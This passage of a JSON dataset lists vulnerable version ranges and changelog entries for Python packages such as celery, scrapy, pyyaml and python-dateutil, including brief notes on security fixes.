Naomi Elstein\n\n- Bump Python 3.10.0 to rc2.\n- [pre-commit.ci] pre-commit autoupdate (6972).\n- autopep8.\n- Prevent worker to send expired revoked items upon hello command (6975).\n- docs: clarify the 'keeping results' section (6979).\n- Update deprecated task module removal in 5.0 documentation (6981).\n- [pre-commit.ci] pre-commit autoupdate.\n- try python 3.10 GA.\n- mention python 3.10 on readme.\n- Documenting the default consumer_timeout value for rabbitmq >= 3.8.15.\n- Azure blockblob backend parametrized connection/read timeouts (6978).\n- Add as_uri method to azure block blob backend.\n- Add possibility to override backend implementation with celeryconfig (6879).\n- [pre-commit.ci] pre-commit autoupdate.\n- try to fix deprecation warning.\n- [pre-commit.ci] pre-commit autoupdate.\n- not needed anyore.\n- not needed anyore.\n- not used anymore.\n- add github discussions forum\n\n.. _version-5.2.0rc1:\n\n", "5.2.0b3": "=======\n\n:release-date: 2021-09-02 8.38 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Add args to LOG_RECEIVED (fixes 6885) (6898).\n- Terminate job implementation for eventlet concurrency backend (6917).\n- Add cleanup implementation to filesystem backend (6919).\n- [pre-commit.ci] pre-commit autoupdate (69).\n- Add before_start hook (fixes 4110) (6923).\n- Restart consumer if connection drops (6930).\n- Remove outdated optimization documentation (6933).\n- added https verification check functionality in arangodb backend (6800).\n- Drop Python 3.6 support.\n- update supported python versions on readme.\n- [pre-commit.ci] pre-commit autoupdate (6935).\n- Remove appveyor configuration since we migrated to GA.\n- pyugrade is now set to upgrade code to 3.7.\n- Drop exclude statement since we no longer test with pypy-3.6.\n- 3.10 is not GA so it's not supported yet.\n- Celery 5.1 or earlier support Python 3.6.\n- Fix linting error.\n- fix: Pass a Context when chaining fail results (6899).\n- Bump version: 5.2.0b2 \u2192 5.2.0b3.\n\n.. _version-5.2.0b2:\n\n", "5.2.0b2": "=======\n\n:release-date: 2021-08-17 5.35 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Test windows on py3.10rc1 and pypy3.7 (6868).\n- Route chord_unlock task to the same queue as chord body (6896).\n- Add message properties to app.tasks.Context (6818).\n- handle already converted LogLevel and JSON (6915).\n- 5.2 is codenamed dawn-chorus.\n- Bump version: 5.2.0b1 \u2192 5.2.0b2.\n\n.. _version-5.2.0b1:\n\n", "5.2.0b1": "=======\n\n:release-date: 2021-08-11 5.42 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Add Python 3.10 support (6807).\n- Fix docstring for Signal.send to match code (6835).\n- No blank line in log output (6838).\n- Chords get body_type independently to handle cases where body.type does not exist (6847).\n- Fix 6844 by allowing safe queries via app.inspect().active() (6849).\n- Fix multithreaded backend usage (6851).\n- Fix Open Collective donate button (6848).\n- Fix setting worker concurrency option after signal (6853).\n- Make ResultSet.on_ready promise hold a weakref to self (6784).\n- Update configuration.rst.\n- Discard jobs on flush if synack isn't enabled (6863).\n- Bump click version to 8.0 (6861).\n- Amend IRC network link to Libera (6837).\n- Import celery lazily in pytest plugin and unignore flake8 F821, \"undefined name '...'\" (6872).\n- Fix inspect --json output to return valid json without --quiet.\n- Remove celery.task references in modules, docs (6869).\n-  The Consul backend must correctly associate requests and responses (6823).\n"}}, {"name": "scrapy", "insecurity": ["<1.8.1", "<1.8.2", "<1.8.3", "<1.8.4", "<2.11.2", ">=0,<0.24.0", ">=0,<1.8.2", ">=0,<1.8.4", ">=0.7,<=2.11.1", ">=2,<2.11.1", ">=2,<2.6.2", ">=2.0.0,<2.11.1", ">=2.0.0,<2.5.1", ">=2.0.0,<2.6.0", ">=2.0.0,<2.6.2"], "changelog": {}}, {"name": "pyyaml", "insecurity": ["<4", "<5.3.1", "<5.4", ">=5.1,<=5.1.2"], "changelog": {"6.0.1": "\n* https://github.com/yaml/pyyaml/pull/702 -- pin Cython build dep to < 3.0\n\n", "6.0": "\n* https://github.com/yaml/pyyaml/pull/327 -- Change README format to Markdown\n* https://github.com/yaml/pyyaml/pull/483 -- Add a test for YAML 1.1 types\n* https://github.com/yaml/pyyaml/pull/497 -- fix float resolver to ignore `.` and `._`\n* https://github.com/yaml/pyyaml/pull/550 -- drop Python 2.7\n* https://github.com/yaml/pyyaml/pull/553 -- Fix spelling of \u201chexadecimal\u201d\n* https://github.com/yaml/pyyaml/pull/556 -- fix representation of Enum subclasses\n* https://github.com/yaml/pyyaml/pull/557 -- fix libyaml extension compiler warnings\n* https://github.com/yaml/pyyaml/pull/560 -- fix ResourceWarning on leaked file descriptors\n* https://github.com/yaml/pyyaml/pull/561 -- always require `Loader` arg to `yaml.load()`\n* https://github.com/yaml/pyyaml/pull/564 -- remove remaining direct distutils usage\n\n", "5.4.1": "\n* https://github.com/yaml/pyyaml/pull/480 -- Fix stub compat with older pyyaml versions that may unwittingly load it\n\n", "5.4": "\n* https://github.com/yaml/pyyaml/pull/407 -- Build modernization, remove distutils, fix metadata, build wheels, CI to GHA\n* https://github.com/yaml/pyyaml/pull/472 -- Fix for CVE-2020-14343, moves arbitrary python tags to UnsafeLoader\n* https://github.com/yaml/pyyaml/pull/441 -- Fix memory leak in implicit resolver setup\n* https://github.com/yaml/pyyaml/pull/392 -- Fix py2 copy support for timezone objects\n* https://github.com/yaml/pyyaml/pull/378 -- Fix compatibility with Jython\n\n", "5.3.1": "\n* https://github.com/yaml/pyyaml/pull/386 -- Prevents arbitrary code execution during python/object/new constructor\n\n", "5.3": "\n* https://github.com/yaml/pyyaml/pull/290 -- Use `is` instead of equality for comparing with `None`\n* https://github.com/yaml/pyyaml/pull/270 -- Fix typos and stylistic nit\n* https://github.com/yaml/pyyaml/pull/309 -- Fix up small typo\n* https://github.com/yaml/pyyaml/pull/161 -- Fix handling of __slots__\n* https://github.com/yaml/pyyaml/pull/358 -- Allow calling add_multi_constructor with None\n* https://github.com/yaml/pyyaml/pull/285 -- Add use of safe_load() function in README\n* https://github.com/yaml/pyyaml/pull/351 -- Fix reader for Unicode code points over 0xFFFF\n* https://github.com/yaml/pyyaml/pull/360 -- Enable certain unicode tests when maxunicode not > 0xffff\n* https://github.com/yaml/pyyaml/pull/359 -- Use full_load in yaml-highlight example\n* https://github.com/yaml/pyyaml/pull/244 -- Document that PyYAML is implemented with Cython\n* https://github.com/yaml/pyyaml/pull/329 -- Fix for Python 3.10\n* https://github.com/yaml/pyyaml/pull/310 -- Increase size of index, line, and column fields\n* https://github.com/yaml/pyyaml/pull/260 -- Remove some unused imports\n* https://github.com/yaml/pyyaml/pull/163 -- Create timezone-aware datetimes when parsed as such\n* https://github.com/yaml/pyyaml/pull/363 -- Add tests for timezone\n\n", "5.2": "------------------\n\n* Repair incompatibilities introduced with 5.1. The default Loader was changed,\n  but several methods like add_constructor still used the old default\n  https://github.com/yaml/pyyaml/pull/279 -- A more flexible fix for custom tag constructors\n  https://github.com/yaml/pyyaml/pull/287 -- Change default loader for yaml.add_constructor\n  https://github.com/yaml/pyyaml/pull/305 -- Change default loader for add_implicit_resolver, add_path_resolver\n* Make FullLoader safer by removing python/object/apply from the default FullLoader\n  https://github.com/yaml/pyyaml/pull/347 -- Move constructor for object/apply to UnsafeConstructor\n* Fix bug introduced in 5.1 where quoting went wrong on systems with sys.maxunicode <= 0xffff\n  https://github.com/yaml/pyyaml/pull/276 -- Fix logic for quoting special characters\n* Other PRs:\n  https://github.com/yaml/pyyaml/pull/280 -- Update CHANGES for 5.1\n\n", "5.1.2": "------------------\n\n* Re-release of 5.1 with regenerated Cython sources to build properly for Python 3.8b2+\n\n", "5.1.1": "------------------\n\n* Re-release of 5.1 with regenerated Cython sources to build properly for Python 3.8b1\n\n", "5.1": "----------------\n\n* https://github.com/yaml/pyyaml/pull/35 -- Some modernization of the test running\n* https://github.com/yaml/pyyaml/pull/42 -- Install tox in a virtualenv\n* https://github.com/yaml/pyyaml/pull/45 -- Allow colon in a plain scalar in a flow context\n* https://github.com/yaml/pyyaml/pull/48 -- Fix typos\n* https://github.com/yaml/pyyaml/pull/55 -- Improve RepresenterError creation\n* https://github.com/yaml/pyyaml/pull/59 -- Resolves #57, update readme issues link\n* https://github.com/yaml/pyyaml/pull/60 -- Document and test Python 3.6 support\n* https://github.com/yaml/pyyaml/pull/61 -- Use Travis CI built in pip cache support\n* https://github.com/yaml/pyyaml/pull/62 -- Remove tox workaround for Travis CI\n* https://github.com/yaml/pyyaml/pull/63 -- Adding support to Unicode characters over codepoint 0xffff\n* https://github.com/yaml/pyyaml/pull/75 -- add 3.12 changelog\n* https://github.com/yaml/pyyaml/pull/76 -- Fallback to Pure Python if Compilation fails\n* https://github.com/yaml/pyyaml/pull/84 -- Drop unsupported Python 3.3\n* https://github.com/yaml/pyyaml/pull/102 -- Include license file in the generated wheel package\n* https://github.com/yaml/pyyaml/pull/105 -- Removed Python 2.6 & 3.3 support\n* https://github.com/yaml/pyyaml/pull/111 -- Remove commented out Psyco code\n* https://github.com/yaml/pyyaml/pull/129 -- Remove call to `ord` in lib3 emitter code\n* https://github.com/yaml/pyyaml/pull/149 -- Test on Python 3.7-dev\n* https://github.com/yaml/pyyaml/pull/158 -- Support escaped slash in double quotes \"\\/\"\n* https://github.com/yaml/pyyaml/pull/175 -- Updated link to pypi in release announcement\n* https://github.com/yaml/pyyaml/pull/181 -- Import Hashable from collections.abc\n* https://github.com/yaml/pyyaml/pull/194 -- Reverting https://github.com/yaml/pyyaml/pull/74\n* https://github.com/yaml/pyyaml/pull/195 -- Build libyaml on travis\n* https://github.com/yaml/pyyaml/pull/196 -- Force cython when building sdist\n* https://github.com/yaml/pyyaml/pull/254 -- Allow to turn off sorting keys in Dumper (2)\n* https://github.com/yaml/pyyaml/pull/256 -- Make default_flow_style=False\n* https://github.com/yaml/pyyaml/pull/257 -- Deprecate yaml.load and add FullLoader and UnsafeLoader classes\n* https://github.com/yaml/pyyaml/pull/261 -- Skip certain unicode tests when maxunicode not > 0xffff\n* https://github.com/yaml/pyyaml/pull/263 -- Windows Appveyor build\n\n", "3.13": "-----------------\n\n* Resolved issues around PyYAML working in Python 3.7.\n\n", "3.12": "-----------------\n\n* Wheel packages for Windows binaries.\n* Adding an implicit resolver to a derived loader should not affect the base loader.\n* Uniform representation for OrderedDict? across different versions of Python.\n* Fixed comparison to None warning.\n\n", "3.11": "-----------------\n\n* Source and binary distributions are rebuilt against the latest\n  versions of Cython and LibYAML.\n\n", "3.10": "-----------------\n\n* Do not try to build LibYAML bindings on platforms other than CPython\n  (Thank to olt(at)bogosoft(dot)com).\n* Clear cyclic references in the parser and the emitter\n  (Thank to kristjan(at)ccpgames(dot)com).\n* Dropped support for Python 2.3 and 2.4.\n\n", "3.09": "-----------------\n\n* Fixed an obscure scanner error not reported when there is\n  no line break at the end of the stream (Thank to Ingy).\n* Fixed use of uninitialized memory when emitting anchors with\n  LibYAML bindings (Thank to cegner(at)yahoo-inc(dot)com).\n* Fixed emitting incorrect BOM characters for UTF-16 (Thank to\n  Valentin Nechayev)\n* Fixed the emitter for folded scalars not respecting the preferred\n  line width (Thank to Ingy).\n* Fixed a subtle ordering issue with emitting '%TAG' directives\n  (Thank to Andrey Somov).\n* Fixed performance regression with LibYAML bindings.\n\n\n", "3.08": "-----------------\n\n* Python 3 support (Thank to Erick Tryzelaar).\n* Use Cython instead of Pyrex to build LibYAML bindings.\n* Refactored support for unicode and byte input/output streams.\n\n\n", "3.07": "-----------------\n\n* The emitter learned to use an optional indentation indicator\n  for block scalar; thus scalars with leading whitespaces\n  could now be represented in a literal or folded style.\n* The test suite is now included in the source distribution.\n  To run the tests, type 'python setup.py test'.\n* Refactored the test suite: dropped unittest in favor of\n  a custom test appliance.\n* Fixed the path resolver in CDumper.\n* Forced an explicit document end indicator when there is\n  a possibility of parsing ambiguity.\n* More setup.py improvements: the package should be usable\n  when any combination of setuptools, Pyrex and LibYAML\n  is installed.\n* Windows binary packages are built against LibYAML-0.1.2.\n* Minor typos and corrections (Thank to Ingy dot Net\n  and Andrey Somov).\n\n\n", "3.06": "-----------------\n\n* setup.py checks whether LibYAML is installed and if so, builds\n  and installs LibYAML bindings.  To force or disable installation\n  of LibYAML bindings, use '--with-libyaml' or '--without-libyaml'\n  respectively.\n* The source distribution includes compiled Pyrex sources so\n  building LibYAML bindings no longer requires Pyrex installed.\n* 'yaml.load()' raises an exception if the input stream contains\n  more than one YAML document.\n* Fixed exceptions produced by LibYAML bindings.\n* Fixed a dot '.' character being recognized as !!float.\n* Fixed Python 2.3 compatibility issue in constructing !!timestamp values.\n* Windows binary packages are built against the LibYAML stable branch.\n* Added attributes 'yaml.__version__' and  'yaml.__with_libyaml__'.\n\n\n", "3.05": "-----------------\n\n* Windows binary packages were built with LibYAML trunk.\n* Fixed a bug that prevent processing a live stream of YAML documents in\n  timely manner (Thanks edward(at)sweetbytes(dot)net).\n* Fixed a bug when the path in add_path_resolver contains boolean values\n  (Thanks jstroud(at)mbi(dot)ucla(dot)edu).\n* Fixed loss of microsecond precision in timestamps\n  (Thanks edemaine(at)mit(dot)edu).\n* Fixed loading an empty YAML stream.\n* Allowed immutable subclasses of YAMLObject.\n* Made the encoding of the unicode->str conversion explicit so that\n  the conversion does not depend on the default Python encoding.\n* Forced emitting float values in a YAML compatible form.\n\n\n", "3.04": "-----------------\n\n* Include experimental LibYAML bindings.\n* Fully support recursive structures.\n* Sort dictionary keys.  Mapping node values are now represented\n  as lists of pairs instead of dictionaries.  No longer check\n  for duplicate mapping keys as it didn't work correctly anyway.\n* Fix invalid output of single-quoted scalars in cases when a single\n  quote is not escaped when preceded by whitespaces or line breaks.\n* To make porting easier, rewrite Parser not using generators.\n* Fix handling of unexpected block mapping values.\n* Fix a bug in Representer.represent_object: copy_reg.dispatch_table\n  was not correctly handled.\n* Fix a bug when a block scalar is incorrectly emitted in the simple\n  key context.\n* Hold references to the objects being represented.\n* Make Representer not try to guess !!pairs when a list is represented.\n* Fix timestamp constructing and representing.\n* Fix the 'N' plain scalar being incorrectly recognized as !!bool.\n\n\n", "3.03": "-----------------\n\n* Fix Python 2.5 compatibility issues.\n* Fix numerous bugs in the float handling.\n* Fix scanning some ill-formed documents.\n* Other minor fixes.\n\n\n", "3.02": "-----------------\n\n* Fix win32 installer.  Apparently bdist_wininst does not work well\n  under Linux.\n* Fix a bug in add_path_resolver.\n* Add the yaml-highlight example.  Try to run on a color terminal:\n  `python yaml_hl.py <any_document.yaml`.\n\n\n", "3.01": "-----------------\n\n* Initial release.  The version number reflects the codename\n  of the project (PyYAML 3000) and differentiates it from\n  the abandoned PyYaml module.\n\n"}}, {"name": "python-dateutil", "insecurity": [], "changelog": {"2.9.0.post0": "================================\n\nBugfixes\n--------\n\n- Pinned ``setuptools_scm`` to ``<8``, which should make the generated ``_version.py`` file compatible with all supported versions of Python.\n\n\n", "2.9.0": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to 2024a. (gh pr 1342)\n\n\nFeatures\n--------\n\n- Made all ``dateutil`` submodules lazily imported using `PEP 562\n  <https://www.python.org/dev/peps/pep-0562/>`_. On Python 3.7+, things like\n  ``import dateutil; dateutil.tz.gettz(\"America/New_York\")`` will now work\n  without explicitly importing ``dateutil.tz``, with the import occurring behind\n  the scenes on first use. The old behavior remains on Python 3.6 and earlier.\n  Fixed by Orson Adams. (gh issue 771, gh pr 1007)\n\n\nBugfixes\n--------\n\n- Removed a call to ``datetime.utcfromtimestamp``, which is deprecated as of Python 3.12. Reported by Hugo van Kemenade (gh pr 1284), fixed by Thomas Grainger (gh pr 1285).\n\n\nDocumentation changes\n---------------------\n\n- Added note into docs and tests where relativedelta would return last day of the month\n  only if the same day on a different month resolves to a date that doesn't exist.\n  Reported by hawkEye-01 (gh issue 1167). Fixed by Mifrill (gh pr 1168)\n\n\n", "2.8.2": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to 2021a. (gh pr 1128)\n\n\nBugfixes\n--------\n\n- Fixed a bug in the parser where non-``ValueError`` exceptions would be raised\n  during exception handling; this would happen, for example, if an\n  ``IllegalMonthError`` was raised in ``dateutil`` code. Fixed by Mark Bailey.\n  (gh issue 981, pr 987).\n- Fixed the custom ``repr`` for ``dateutil.parser.ParserError``, which was not\n  defined due to an indentation error. (gh issue 991, gh pr 993)\n- Fixed a bug that caused ``b'`` prefixes to appear in parse_isodate exception\n  messages. Reported and fixed by Paul Brown (pawl) (gh pr 1122)\n- Make ``isoparse`` raise when trying to parse times with inconsistent use of\n  `:` separator. Reported and fixed by mariocj89 (gh pr 1125).\n- Fixed ``tz.gettz()`` not returning local time when passed an empty string.\n  Reported by labrys (gh issues 925, 926). Fixed by ffe4 (gh pr 1024)\n\n\nDocumentation changes\n---------------------\n\n- Rearranged parser documentation into \"Functions\", \"Classes\" and \"Warnings and\n  Exceptions\" categories. (gh issue 992, pr 994).\n- Updated ``parser.parse`` documentation to reflect the switch from\n  ``ValueError`` to ``ParserError``. (gh issue 992, pr 994).\n- Fixed methods in the ``rrule`` module not being displayed in the docs. (gh pr\n  1025)\n- Changed some relative links in the exercise documentation to refer to the\n  document locations in the input tree, rather than the generated HTML files in\n  the HTML output tree (which presumably will not exist in non-HTML output\n  formats). (gh pr 1078).\n\n\nMisc\n----\n\n- Moved ``test_imports.py``, ``test_internals.py`` and ``test_utils.py`` to\n  pytest.  Reported and fixed by jpurviance (gh pr 978)\n- Added project_urls for documentation and source. Patch by andriyor (gh pr\n  975).\n- Simplified handling of bytes and bytearray in ``_parser._timelex``. Reported\n  and fixed by frenzymadness (gh issue 1060).\n- Changed the tests against the upstream tz database to always generate fat\n  binaries, since until GH-590 and GH-1059 are resolved, \"slim\" zic binaries\n  will cause problems in many zones, causing the tests to fail. This also\n  updates ``zoneinfo.rebuild`` to always generate fat binaries. (gh pr 1076).\n- Moved sdist and wheel generation to use `python-build`. Reported and fixed by\n  mariocj89 (gh pr 1133).\n\n\n", "2.8.1": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to 2019c.\n\n\nBugfixes\n--------\n\n- Fixed a race condition in the ``tzoffset`` and ``tzstr`` \"strong\" caches on\n  Python 2.7. Reported by kainjow (gh issue 901).\n- Parsing errors will now raise ``ParserError``, a subclass of ``ValueError``,\n  which has a nicer string representation. Patch by gfyoung (gh pr 881).\n- ``parser.parse`` will now raise ``TypeError`` when ``tzinfos`` is passed a\n  type that cannot be interpreted as a time zone. Prior to this change, it\n  would raise an ``UnboundLocalError`` instead.  Patch by jbrockmendel (gh pr\n  891).\n- Changed error message raised when when passing a ``bytes`` object as the time\n  zone name to gettz in Python 3.  Reported and fixed by labrys () (gh issue\n  927, gh pr 935).\n- Changed compatibility logic to support a potential Python 4.0 release. Patch\n  by Hugo van Kemenade (gh pr 950).\n- Updated many modules to use ``tz.UTC`` in favor of ``tz.tzutc()`` internally,\n  to avoid an unnecessary function call. (gh pr 910).\n- Fixed issue where ``dateutil.tz`` was using a backported version of\n  ``contextlib.nullcontext`` even in Python 3.7 due to a malformed import\n  statement. (gh pr 963).\n\n\nTests\n-----\n\n- Switched from using assertWarns to using pytest.warns in the test suite. (gh\n  pr 969).\n- Fix typo in setup.cfg causing PendingDeprecationWarning to not be explicitly\n  specified as an error in the warnings filter. (gh pr 966)\n- Fixed issue where ``test_tzlocal_offset_equal`` would fail in certain\n  environments (such as FreeBSD) due to an invalid assumption about what time\n  zone names are provided. Reported and fixed by Kubilay Kocak (gh issue 918,\n  pr 928).\n- Fixed a minor bug in ``test_isoparser`` related to ``bytes``/``str``\n  handling. Fixed by fhuang5 (gh issue 776, gh pr 879).\n- Explicitly listed all markers used in the pytest configuration. (gh pr 915)\n- Extensive improvements to the parser test suite, including the adoption of\n  ``pytest``-style tests and the addition of parametrization of several test\n  cases. Patches by jbrockmendel (gh prs 735, 890, 892, 894).\n- Added tests for tzinfos input types. Patch by jbrockmendel (gh pr 891).\n- Fixed failure of test suite when changing the TZ variable is forbidden.\n  Patch by shadchin (gh pr 893).\n- Pinned all test dependencies on Python 3.3. (gh prs 934, 962)\n\n\nDocumentation changes\n---------------------\n\n- Fixed many misspellings, typos and styling errors in the comments and\n  documentation. Patch by Hugo van Kemenade (gh pr 952).\n\n\nMisc\n----\n\n- Added Python 3.8 to the trove classifiers. (gh pr 970)\n- Moved as many keys from ``setup.py`` to ``setup.cfg`` as possible.  Fixed by\n  FakeNameSE, aquinlan82, jachen20, and gurgenz221 (gh issue 871, gh pr\n  880).\n- Reorganized ``parser`` methods by functionality. Patch by jbrockmendel (gh\n  pr 882).\n- Switched ``release.py`` over to using ``pep517.build`` for creating releases,\n  rather than direct invocations of ``setup.py``. Fixed by smeng10 (gh issue\n  869, gh pr 875).\n- Added a \"build\" environment into the tox configuration, to handle dependency\n  management when making releases. Fixed by smeng10 (gh issue 870,r\n  gh pr 876).\n- GH 916, GH 971\n\n\n", "2.8.0": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to to 2018i.\n\n\nFeatures\n--------\n\n- Added support for ``EXDATE`` parameters when parsing ``rrule`` strings.\n  Reported by mlorant (gh issue 410), fixed by nicoe (gh pr 859).\n- Added support for sub-minute time zone offsets in Python 3.6+.\n  Fixed by cssherry (gh issue 582, pr 763)\n- Switched the ``tzoffset``, ``tzstr`` and ``gettz`` caches over to using weak\n  references, so that the cache expires when no other references to the\n  original ``tzinfo`` objects exist. This cache-expiry behavior is not\n  guaranteed in the public interface and may change in the future. To improve\n  performance in the case where transient references to the same time zones\n  are repeatedly created but no strong reference is continuously held, a\n  smaller \"strong value\" cache was also added. Weak value cache implemented by\n  cs-cordero (gh pr 672, 801), strong cache added by\n  G\u00f6k\u00e7en Nurlu (gh issue 691, gh pr 761)\n\n\nBugfixes\n--------\n\n- Add support for ISO 8601 times with comma as the decimal separator in the\n  ``dateutil.parser.isoparse`` function. (gh pr 721)\n- Changed handling of ``T24:00`` to be compliant with the standard. ``T24:00``\n  now represents midnight on the *following* day.\n  Fixed by cheukting (gh issue 658, gh pr 751)\n- Fixed an issue where ``isoparser.parse_isotime`` was unable to handle the\n  ``24:00`` variant representation of midnight. (gh pr 773)\n- Added support for more than 6 fractional digits in `isoparse`.\n  Reported and fixed by jayschwa (gh issue 786, gh pr 787).\n- Added 'z' (lower case Z) as valid UTC time zone in isoparser.\n  Reported by cjgibson (gh issue 820). Fixed by Cheukting (gh pr 822)\n- Fixed a bug with base offset changes during DST in ``tzfile``, and refactored\n  the way base offset changes are detected. Originally reported on\n  Stack Overflow by MartinThoma. (gh issue 812, gh pr 810)\n- Fixed error condition in ``tz.gettz`` when a non-ASCII timezone is passed on\n  Windows in Python 2.7. (gh issue 802, pr 861)\n- Improved performance and inspection properties of ``tzname`` methods.\n  (gh pr 811)\n- Removed unnecessary binary_type compatibility shims.\n  Added by jdufresne (gh pr 817)\n- Changed ``python setup.py test`` to print an error to ``stderr`` and exit\n  with 1 instead of 0. Reported and fixed by hroncok (gh pr 814)\n- Added a ``pyproject.toml`` file with build requirements and an explicitly\n  specified build backend. (gh issue 736, gh prs 746, 863)\n\n\nDocumentation changes\n---------------------\n\n- Added documentation for the ``rrule.rrulestr`` function.\n  Fixed by prdickson (gh issue 623, gh pr 762)\n- Add documentation for the ``dateutil.tz.win`` module and mocked out certain\n  Windows-specific modules so that autodoc can still be run on non-Windows\n  systems. (gh issue 442, pr 715)\n- Added changelog to documentation. (gh issue 692, gh pr 707)\n- Improved documentation on the use of ``until`` and ``count`` parameters in\n  ``rrule``. Fixed by lucaferocino (gh pr 755).\n- Added an example of how to use a custom ``parserinfo`` subclass to parse\n  non-standard datetime formats in the examples documentation for ``parser``.\n  Added by prdickson (gh 753)\n- Expanded the description and examples in the ``relativedelta`` class.\n  Contributed by andrewcbennett (gh pr 759)\n- Improved the contributing documentation to clarify where to put new changelog\n  files. Contributed by andrewcbennett (gh pr 757)\n- Fixed a broken doctest in the ``relativedelta`` module.\n  Fixed by nherriot (gh pr 758).\n- Reorganized ``dateutil.tz`` documentation and fixed issue with the\n  ``dateutil.tz`` docstring. (gh pr 714)\n\n\nMisc\n----\n\n- GH 720, GH 723, GH 726, GH 727, GH 740, GH 750, GH 760, GH 767,\n  GH 772, GH 773, GH 780, GH 784, GH 785, GH 791, GH 799, GH 813,\n  GH 836, GH 839, GH 857\n\n\n", "2.7.5": "==========================\n\nData updates\n------------\n\n- Update tzdata to 2018g\n\n\n", "2.7.4": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to 2018f.\n\n\n", "2.7.3": "==========================\n\nData updates\n------------\n\n- Update tzdata to 2018e. (gh pr 710)\n\n\nBugfixes\n--------\n\n- Fixed an issue where ``parser.parse`` would raise ``Decimal``-specific errors\n  instead of a standard ``ValueError`` if certain malformed values were parsed\n  (e.g. ``NaN`` or infinite values). Reported and fixed by\n  amureki (gh issue 662, gh pr 679).\n- Fixed issue in ``parser`` where a ``tzinfos`` call explicitly returning\n  ``None`` would throw a ``ValueError``.\n  Fixed by parsethis (gh issue 661, gh pr 681)\n- Fixed incorrect parsing of certain dates earlier than 100 AD when represented\n  in the form \"%B.%Y.%d\", e.g. \"December.0031.30\". (gh issue 687, pr 700)\n- Added time zone inference when initializing an ``rrule`` with a specified\n  ``UNTIL`` but without an explicitly specified ``DTSTART``; the time zone\n  of the generated ``DTSTART`` will now be taken from the ``UNTIL`` rule.\n  Reported by href (gh issue 652). Fixed by absreim (gh pr 693).\n\nDocumentation changes\n---------------------\n\n- Corrected link syntax and updated URL to https for ISO year week number\n  notation in relativedelta examples. (gh issue 670, pr 711)\n- Add doctest examples to tzfile documentation. Done by weatherpattern and\n  pganssle (gh pr 671)\n- Updated the documentation for relativedelta. Removed references to tuple\n  arguments for weekday, explained effect of weekday(_, 1) and better explained\n  the order of operations that relativedelta applies. Fixed by kvn219\n  huangy22 and ElliotJH (gh pr 673)\n- Added changelog to documentation. (gh issue 692, gh pr 707)\n- Changed order of keywords in rrule docstring. Reported and fixed by\n  rmahajan14 (gh issue 686, gh pr 695).\n- Added documentation for ``dateutil.tz.gettz``. Reported by pganssle (gh\n  issue 647). Fixed by weatherpattern (gh pr 704)\n- Cleaned up malformed RST in the ``tz`` documentation. (gh issue 702, gh pr\n  706)\n- Changed the default theme to ``sphinx_rtd_theme``, and changed the sphinx\n  configuration accordingly. (gh pr 707)\n- Reorganized ``dateutil.tz`` documentation and fixed issue with the\n  ``dateutil.tz`` docstring. (gh pr 714)\n\n\nMisc\n----\n\n- GH 674, GH 688, GH 699\n\n\n", "2.7.2": "==========================\n\nBugfixes\n--------\n\n- Fixed an issue with the setup script running in non-UTF-8 environment.\n  Reported and fixed by gergondet (gh pr 651)\n\n\nMisc\n----\n\n- GH 655\n\n\n", "2.7.1": "===========================\n\nData updates\n------------\n\n- Updated tzdata version to 2018d.\n\n\nBugfixes\n--------\n\n- Fixed issue where parser.parse would occasionally raise\n  decimal.Decimal-specific error types rather than ValueError. Reported by\n  amureki (gh issue 632). Fixed by pganssle (gh pr 636).\n- Improve error message when rrule's dtstart and until are not both naive or\n  both aware. Reported and fixed by ryanpetrello (gh issue 633, gh pr 634)\n\n\nMisc\n----\n\n- GH 644, GH 648\n\n\n", "2.7.0": "=============\n- Dropped support for Python 2.6 (gh pr 362 by jdufresne)\n- Dropped support for Python 3.2 (gh pr 626)\n- Updated zoneinfo file to 2018c (gh pr 616)\n- Changed licensing scheme so all new contributions are dual licensed under\n  Apache 2.0 and BSD. (gh pr 542, issue 496)\n- Added __all__ variable to the root package. Reported by tebriel\n  (gh issue 406), fixed by mariocj89 (gh pr 494)\n- Added python_requires to setup.py so that pip will distribute the right\n  version of dateutil. Fixed by jakec-github (gh issue 537, pr 552)\n- Added the utils submodule, for miscellaneous utilities.\n- Added within_delta function to utils - added by justanr (gh issue 432,\n  gh pr 437)\n- Added today function to utils (gh pr 474)\n- Added default_tzinfo function to utils (gh pr 475), solving an issue\n  reported by nealmcb (gh issue 94)\n- Added dedicated ISO 8601 parsing function isoparse (gh issue 424).\n  Initial implementation by pganssle in gh pr 489 and 622, with a\n  pre-release fix by kirit93 (gh issue 546, gh pr 573).\n- Moved parser module into parser/_parser.py and officially deprecated the use\n  of several private functions and classes from that module. (gh pr 501, 515)\n- Tweaked parser error message to include rejected string format, added by\n  pbiering (gh pr 300)\n- Add support for parsing bytesarray, reported by uckelman (gh issue 417) and\n  fixed by uckelman and pganssle (gh pr 514)\n- Started raising a warning when the parser finds a timezone string that it\n  cannot construct a tzinfo instance for (rather than succeeding with no\n  indication of an error). Reported and fixed by jbrockmendel (gh pr 540)\n- Dropped the use of assert in the parser. Fixed by jbrockmendel (gh pr 502)\n- Fixed to assertion logic in parser to support dates like '2015-15-May',\n  reported and fixed by jbrockmendel (gh pr 409)\n- Fixed IndexError in parser on dates with trailing colons, reported and fixed\n  by jbrockmendel (gh pr 420)\n- Fixed bug where hours were not validated, leading to improper parse. Reported\n  by heappro (gh pr 353), fixed by jbrockmendel (gh pr 482)\n- Fixed problem parsing strings in %b-%Y-%d format. Reported and fixed by\n  jbrockmendel (gh pr 481)\n- Fixed problem parsing strings in the %d%B%y format. Reported by asishm\n  (gh issue 360), fixed by jbrockmendel (gh pr 483)\n- Fixed problem parsing certain unambiguous strings when year <99 (gh pr 510).\n  Reported by alexwlchan (gh issue 293).\n- Fixed issue with parsing an unambiguous string representation of an ambiguous\n  datetime such that if possible the correct value for fold is set. Fixes\n  issue reported by JordonPhillips and pganssle (gh issue 318, 320,\n  gh pr 517)\n- Fixed issue with improper rounding of fractional components. Reported by\n  dddmello (gh issue 427), fixed by m-dz (gh pr 570)\n- Performance improvement to parser from removing certain min() calls. Reported\n  and fixed by jbrockmendel (gh pr 589)\n- Significantly refactored parser code by jbrockmendel (gh prs 419, 436,\n  490, 498, 539) and pganssle (gh prs 435, 468)\n- Implemented of __hash__ for relativedelta and weekday, reported and fixed\n  by mrigor (gh pr 389)\n- Implemented __abs__ for relativedelta. 